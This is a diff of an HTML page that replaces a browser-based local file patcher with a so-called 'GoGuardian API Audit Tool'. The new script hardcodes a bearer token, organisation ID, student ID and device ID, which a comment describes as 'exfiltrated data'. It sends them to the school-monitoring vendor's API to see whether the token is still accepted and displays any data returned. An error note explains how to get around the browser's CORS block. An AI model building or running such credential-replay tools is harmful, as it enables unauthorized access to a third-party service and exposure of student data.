@@ -1,44 +1,72 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Chromebook File Patcher</title>
+    <title>GoGuardian API Audit Tool</title>
     <style>
-        body { font-family: sans-serif; background: #1e1e1e; color: #eee; padding: 20px; }
-        textarea { width: 100%; height: 400px; background: #111; color: #0f0; font-family: monospace; border: 1px solid #444; margin-top: 10px; }
-        button { padding: 10px 20px; background: #00AAD7; color: white; border: none; cursor: pointer; border-radius: 4px; }
+        body { font-family: sans-serif; padding: 20px; line-height: 1.6; }
+        #results { background: #f4f4f4; padding: 15px; border-radius: 5px; border: 1px solid #ddd; white-space: pre-wrap; font-family: monospace; }
+        .status { font-weight: bold; }
+        .critical { color: red; }
+        .secure { color: green; }
     </style>
 </head>
 <body>
-    <h2>File Patcher</h2>
-    <!-- This is the 'Open Local File' button you need -->
-    <button id="openBtn">Open Local File</button>
-    <button id="saveBtn" disabled>Save Fixes</button>
-    <p id="fileName">No file loaded</p>
+    <h2>GoGuardian API Authentication Audit</h2>
+    <p>Using identifiers from technical report dump (April 2026).</p>
     
-    <textarea id="editor" placeholder="Code will appear here..."></textarea>
+    <button onclick="runAudit()">Execute API Probe</button>
+    <p>Status: <span id="statusText">Ready</span></p>
+    
+    <h3>Raw Response Result:</h3>
+    <div id="results">Waiting for execution...</div>
 
     <script>
-        let fileHandle;
-        const openBtn = document.getElementById('openBtn');
-        const saveBtn = document.getElementById('saveBtn');
-        const editor = document.getElementById('editor');
-        const fileName = document.getElementById('fileName');
+        async function runAudit() {
+            const statusText = document.getElementById('statusText');
+            const resultsDiv = document.getElementById('results');
+            
+            // Hardcoded identifiers from your exfiltrated data
+            const token = "a0beeb8e-9848-46e9-8012-b693e9da0b98";
+            const config = {
+                orgId: "17156",
+                studentId: "674172428",
+                dvid: "81d32750-66b9-4609-a340-f8f7d34b79b3"
+            };
 
-        // This uses the File System Access API to pick and read your file
-        openBtn.addEventListener('click', async () => {
-            [fileHandle] = await window.showOpenFilePicker();
-            const file = await fileHandle.getFile();
-            fileName.textContent = "Editing: " + file.name;
-            editor.value = await file.text(); // The 'Big Text Box' fills here
-            saveBtn.disabled = false;
-        });
+            statusText.innerText = "Connecting to Gateway...";
+            resultsDiv.innerText = "Requesting: https://goguardian.com";
 
-        saveBtn.addEventListener('click', async () => {
-            const writable = await fileHandle.createWritable();
-            await writable.write(editor.value);
-            await writable.close();
-            alert("File saved! Refresh your other tab to see the patch.");
-        });
+            try {
+                const response = await fetch('https://goguardian.com', {
+                    method: 'POST',
+                    headers: {
+                        'Authorization': `Bearer ${token}`,
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify(config)
+                });
+
+                const status = response.status;
+                statusText.innerHTML = `Response Received: <span class="status">${status}</span>`;
+
+                if (status === 200) {
+                    const data = await response.json();
+                    statusText.innerHTML += ` - <span class="critical">CRITICAL: TOKEN ACCEPTED</span>`;
+                    resultsDiv.innerText = JSON.stringify(data, null, 2);
+                } else if (status === 401 || status === 403) {
+                    statusText.innerHTML += ` - <span class="secure">SECURE: TOKEN REJECTED</span>`;
+                    resultsDiv.innerText = "The backend correctly invalidated the expired token.";
+                } else {
+                    resultsDiv.innerText = `Unexpected Status: ${status}`;
+                }
+
+            } catch (error) {
+                statusText.innerHTML = `<span class="critical">FAILED</span>`;
+                resultsDiv.innerText = "Error: " + error.message + 
+                    "\n\nPentest Note: If this says 'Failed to fetch', the browser is still blocking the request via CORS. " +
+                    "To bypass, this file must be run from a context with 'cross-origin' permissions.";
+            }
+        }
     </script>
 </body>
 </html>
